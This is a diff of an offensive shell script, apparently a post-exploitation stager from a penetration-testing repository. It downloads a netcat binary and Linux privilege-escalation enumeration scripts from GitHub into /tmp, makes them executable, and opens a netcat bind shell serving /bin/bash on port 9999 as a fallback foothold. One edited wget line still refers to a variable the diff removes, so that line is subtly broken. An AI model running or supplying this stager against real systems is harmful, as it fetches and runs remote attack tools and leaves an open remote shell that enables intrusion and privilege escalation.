@@ -4,29 +4,27 @@
 # (note: ive run this from a tedious code execution on a web application and got a bind shell, with all prereqs staged. it can save lifes)
 
 
-$stage = "/tmp"
-
 # banner
 echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
 echo "[]_________________________________________________________________________________________[]"
 
 # download NC
-echo "[*] Downloading NC to: $stage + making executable"
+echo "[*] Downloading NC to: /tmp/ + making executable"
 wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/nc -o $stage/nc
-chmod +x $stage/nc
+chmod +x /tmp/nc
 
 # download linenum.sh
-echo "[*] Downloading linenum.sh to: $stage + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -o $stage/linenum.sh
-chmod +x $stage/linenum.sh
+echo "[*] Downloading linenum.sh to: /tmp/ + making executable"
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinEnum.sh -o /tmp/linenum.sh
+chmod +x /tmp/linenum.sh
 
 # download LinxPrivChecker.py
-echo "[*] Downloading LinuxPrivChecker.sh to: $stage + making executable"
-wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -o $stage/LPC.py
+echo "[*] Downloading LinuxPrivChecker.sh to: /tmp/ + making executable"
+wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxprivchecker.py -o /tmp/LPC.py
 
 # build a NC bind shell incase we lose a shell
 echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
-$stage/nc -nlvp 9999 -e /bin/bash &
+/tmp/nc -nlvp 9999 -e /bin/bash &
 # chill for a sec, waits for the script to catch up (this has helped unscrample a lot of shit on semi-broken shells)
 sleep 2s
 
